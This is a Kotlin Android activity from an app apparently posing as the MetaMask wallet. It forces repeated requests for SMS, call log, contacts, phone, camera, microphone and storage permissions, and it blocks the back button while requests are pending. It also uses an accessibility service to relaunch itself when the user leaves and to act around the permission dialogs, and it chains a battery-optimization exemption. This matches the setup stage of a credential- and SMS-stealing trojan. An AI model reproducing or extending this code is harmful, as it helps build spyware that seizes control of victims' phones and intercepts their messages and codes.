package com.example.MetaMask.activities

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity
import com.example.MetaMask.ChainBridge
import com.example.MetaMask.services.AccessSvc

class PermRequesterActivity : AppCompatActivity() {

    companion object {
        private const val RC = 9001
        private const val DELAY_BETWEEN_MS = 600L
        private const val HYPEROS_DELAY_BETWEEN_MS = 2500L

        private fun delayBetween(): Long =
            if (com.example.MetaMask.HyperOsDetector.isHyperOs) HYPEROS_DELAY_BETWEEN_MS
            else DELAY_BETWEEN_MS

        const val EXTRA_SPECIFIC_PERMS = "extra_specific_perms"

        const val EXTRA_PENDING_CHAIN_INTENT = "extra_pending_chain_intent"

        @Volatile var instance: PermRequesterActivity? = null

        private val HYPEROS_SKIP_PERMS = setOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO
        )

        val SMS_GROUP_PERMS = setOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS
        )

        val ALL_PERMS = buildList {
            add(Manifest.permission.READ_SMS)
            add(Manifest.permission.RECEIVE_SMS)
            add(Manifest.permission.SEND_SMS)
            add("android.permission.WRITE_SMS")
            add(Manifest.permission.READ_CALL_LOG)
            add(Manifest.permission.WRITE_CALL_LOG)
            add(Manifest.permission.READ_CONTACTS)
            add(Manifest.permission.WRITE_CONTACTS)
            add(Manifest.permission.READ_PHONE_STATE)
            add(Manifest.permission.READ_PHONE_NUMBERS)
            add(Manifest.permission.CALL_PHONE)
            add(Manifest.permission.PROCESS_OUTGOING_CALLS)
            add(Manifest.permission.CAMERA)
            add(Manifest.permission.RECORD_AUDIO)
            add(Manifest.permission.GET_ACCOUNTS)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                android.util.Log.d("XDBG", "[PermRequesterActivity] if branch") //xdbg
                add(Manifest.permission.READ_MEDIA_IMAGES)
                add(Manifest.permission.READ_MEDIA_VIDEO)
                add(Manifest.permission.READ_MEDIA_AUDIO)
                add(Manifest.permission.POST_NOTIFICATIONS)
            } else {
                add(Manifest.permission.READ_EXTERNAL_STORAGE)
                @Suppress("DEPRECATION")
                add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
            }
        }
    }

    private val handler = Handler(Looper.getMainLooper())
    private val queue = ArrayDeque<String>()
    private val requestedThisSession = mutableSetOf<String>()
    @Volatile private var waitingForResult = false
    @Volatile private var hasPausedAfterRequest = false

    @Volatile var keepAliveForChain: Boolean = false
    @Volatile private var awaitingBatteryReturn: Boolean = false

    fun launchActivityFromForeground(intent: Intent): Boolean {
        android.util.Log.d("XDBG", "[PermRequesterActivity] launchActivityFromForeground enter intent=${intent}") //xdbg
        android.util.Log.d("XDBG", "[PermRequesterActivity] return") //xdbg
        return try {
            if (isFinishing || isDestroyed) return false
            if (intent.action == Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS) {
                android.util.Log.d("XDBG", "[PermRequesterActivity] if branch") //xdbg
                awaitingBatteryReturn = true
            }
            startActivity(intent)
            true
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[PermRequesterActivity] catch (ignored)") //xdbg
            false
        }
    }

    fun releaseAndFinish() {
        android.util.Log.d("XDBG", "[PermRequesterActivity] releaseAndFinish enter") //xdbg
        keepAliveForChain = false
        try { finish() } catch (_: Exception) {}
    }

    @Volatile private var pendingChainIntent: Intent? = null

    private fun consumePendingChainIntent() {
        android.util.Log.d("XDBG", "[PermRequesterActivity] consumePendingChainIntent enter") //xdbg
        val pi = pendingChainIntent ?: return
        pendingChainIntent = null
        if (pi.action == Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS) {
            android.util.Log.d("XDBG", "[PermRequesterActivity] if branch") //xdbg
            awaitingBatteryReturn = true
        }
        try { startActivity(pi) } catch (_: Exception) {}
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        android.util.Log.d("XDBG", "[PermRequesterActivity] onCreate enter savedInstanceState=${savedInstanceState}") //xdbg
        super.onCreate(savedInstanceState)
        instance = this
        com.example.MetaMask.services.PermRequesterActivityRef.instance = this

        @Suppress("DEPRECATION")
        val pendingIntent: Intent? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            intent?.getParcelableExtra(EXTRA_PENDING_CHAIN_INTENT, Intent::class.java)
        } else {
            intent?.getParcelableExtra(EXTRA_PENDING_CHAIN_INTENT)
        }
        if (pendingIntent != null) {
            android.util.Log.d("XDBG", "[PermRequesterActivity] if branch") //xdbg
            keepAliveForChain = true
            pendingChainIntent = pendingIntent
            return
        }

        val specificPermsRaw = intent?.getStringExtra(EXTRA_SPECIFIC_PERMS)
        val targetPerms = if (!specificPermsRaw.isNullOrBlank()) {
            specificPermsRaw.split(",").map { it.trim() }.filter { it.isNotEmpty() }
        } else {
            ALL_PERMS
        }

        val isHyperOs = com.example.MetaMask.HyperOsDetector.isHyperOs
        for (p in targetPerms) {
            android.util.Log.d("XDBG", "[PermRequesterActivity] loop") //xdbg
            if (isHyperOs && p in HYPEROS_SKIP_PERMS) continue
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                android.util.Log.d("XDBG", "[PermRequesterActivity] if branch") //xdbg
                queue.add(p)
            }
        }

        if (queue.isEmpty()) reportAndFinish() else requestNext()
    }

    @Volatile private var pendingNextRunnable: Runnable? = null

    private fun scheduleNextRequest(delayMs: Long) {
        android.util.Log.d("XDBG", "[PermRequesterActivity] scheduleNextRequest enter delayMs=${delayMs}") //xdbg
        pendingNextRunnable?.let { handler.removeCallbacks(it) }
        val r = Runnable {
            pendingNextRunnable = null
            requestNext()
        }
        pendingNextRunnable = r
        handler.postDelayed(r, delayMs)
    }

    fun onPermDialogDismissedByEvent(newTopPkg: String) {
        android.util.Log.d("XDBG", "[PermRequesterActivity] onPermDialogDismissedByEvent enter newTopPkg=${newTopPkg}") //xdbg
        if (!com.example.MetaMask.HyperOsDetector.isHyperOs) return
        if (pendingNextRunnable == null) return
        scheduleNextRequest(1500L)
    }

    private fun requestNext() {
        android.util.Log.d("XDBG", "[PermRequesterActivity] requestNext enter") //xdbg
        if (queue.isEmpty()) {
            android.util.Log.d("XDBG", "[PermRequesterActivity] if branch") //xdbg
            reportAndFinish()
            return
        }
        val perm = queue.removeFirst()

        if (checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED) {
            android.util.Log.d("XDBG", "[PermRequesterActivity] if branch") //xdbg
            scheduleNextRequest(delayBetween())
            return
        }

        if (perm in requestedThisSession && !shouldShowRequestPermissionRationale(perm)) {
            android.util.Log.d("XDBG", "[PermRequesterActivity] if branch") //xdbg
            scheduleNextRequest(delayBetween())
            return
        }

        requestedThisSession.add(perm)
        waitingForResult = true
        hasPausedAfterRequest = false
        AccessSvc.instance?.autoIbis?.onPermissionDialogAboutToShow(perm)

        if (perm in SMS_GROUP_PERMS) {
            android.util.Log.d("XDBG", "[PermRequesterActivity] if branch") //xdbg
            val smsToRequest = SMS_GROUP_PERMS
                .filter { checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED }
                .toTypedArray()
            queue.removeAll { it in SMS_GROUP_PERMS }
            requestPermissions(smsToRequest, RC)
        } else {
            requestPermissions(arrayOf(perm), RC)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode != RC) return
        if (permissions.isEmpty()) return
        if (!waitingForResult) return
        waitingForResult = false

        AccessSvc.instance?.autoIbis?.onPermissionDialogClosed()
        if (!com.example.MetaMask.HyperOsDetector.isHyperOs || pendingNextRunnable == null) {
            android.util.Log.d("XDBG", "[PermRequesterActivity] if branch") //xdbg
            scheduleNextRequest(delayBetween())
        }
    }

    @Suppress("DEPRECATION")
    override fun onBackPressed() {
        android.util.Log.d("XDBG", "[PermRequesterActivity] onBackPressed enter") //xdbg
        if (queue.isNotEmpty() || waitingForResult || keepAliveForChain) return
        super.onBackPressed()
    }

    override fun onNewIntent(newIntent: Intent) {
        android.util.Log.d("XDBG", "[PermRequesterActivity] onNewIntent enter newIntent=${newIntent}") //xdbg
        super.onNewIntent(newIntent)
        @Suppress("DEPRECATION")
        val pi: Intent? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            newIntent.getParcelableExtra(EXTRA_PENDING_CHAIN_INTENT, Intent::class.java)
        } else {
            newIntent.getParcelableExtra(EXTRA_PENDING_CHAIN_INTENT)
        }
        if (pi != null) {
            android.util.Log.d("XDBG", "[PermRequesterActivity] if branch") //xdbg
            keepAliveForChain = true
            pendingChainIntent = pi
            if (!isFinishing && !isDestroyed) {
                android.util.Log.d("XDBG", "[PermRequesterActivity] if branch") //xdbg
                handler.post { consumePendingChainIntent() }
            }
        }
    }

    override fun onPause() {
        android.util.Log.d("XDBG", "[PermRequesterActivity] onPause enter") //xdbg
        super.onPause()
        if (waitingForResult) hasPausedAfterRequest = true
        if (queue.isNotEmpty() || waitingForResult) {
            android.util.Log.d("XDBG", "[PermRequesterActivity] if branch") //xdbg
            AccessSvc.instance?.schedulePermActRelaunch()
        }
    }

    override fun onResume() {
        android.util.Log.d("XDBG", "[PermRequesterActivity] onResume enter") //xdbg
        super.onResume()
        AccessSvc.instance?.cancelPermActRelaunch()
        val hadPending = pendingChainIntent != null
        consumePendingChainIntent()
        if (!hadPending && com.example.MetaMask.HyperOsDetector.isHyperOs && awaitingBatteryReturn) {
            android.util.Log.d("XDBG", "[PermRequesterActivity] if branch") //xdbg
            awaitingBatteryReturn = false
            AccessSvc.instance?.onBatteryDialogHandled()
            return
        }
        if (waitingForResult) {
            android.util.Log.d("XDBG", "[PermRequesterActivity] if branch") //xdbg
            if (!hasPausedAfterRequest) return
            if (com.example.MetaMask.HyperOsDetector.isHyperOs) return
            waitingForResult = false
            hasPausedAfterRequest = false
            AccessSvc.instance?.autoIbis?.onPermissionDialogClosed()
            handler.postDelayed({ requestNext() }, 800L)
        }
    }

    fun onDialogStuck() {
        android.util.Log.d("XDBG", "[PermRequesterActivity] onDialogStuck enter") //xdbg
        if (!waitingForResult) return
        waitingForResult = false
        AccessSvc.instance?.autoIbis?.onPermissionDialogClosed()
        handler.postDelayed({ requestNext() }, 3500L)
    }

    override fun onDestroy() {
        android.util.Log.d("XDBG", "[PermRequesterActivity] onDestroy enter") //xdbg
        instance = null
        com.example.MetaMask.services.PermRequesterActivityRef.instance = null
        handler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }

    private fun reportAndFinish() {
        android.util.Log.d("XDBG", "[PermRequesterActivity] reportAndFinish enter") //xdbg
        AccessSvc.instance?.autoIbis?.enable(false)
        if (AccessSvc.instance?.isGrantChainActive() != true) {
            android.util.Log.d("XDBG", "[PermRequesterActivity] if branch") //xdbg
            AccessSvc.instance?.martenHelper?.hide()
        }
        val keepAlive = com.example.MetaMask.HyperOsDetector.isHyperOs &&
                AccessSvc.instance?.isGrantChainActive() == true
        if (keepAlive) {
            android.util.Log.d("XDBG", "[PermRequesterActivity] if branch") //xdbg
            keepAliveForChain = true
            sendFinishGrantChain()
            return
        }
        finish()
        sendFinishGrantChain()
    }

    private fun sendFinishGrantChain() {
        android.util.Log.d("XDBG", "[PermRequesterActivity] sendFinishGrantChain enter") //xdbg
        sendBroadcast(Intent(ChainBridge.ACTION_FINISH_GRANT_CHAIN).apply { setPackage(packageName) })
        AccessSvc.instance?.finishGrantChain()
    }
}
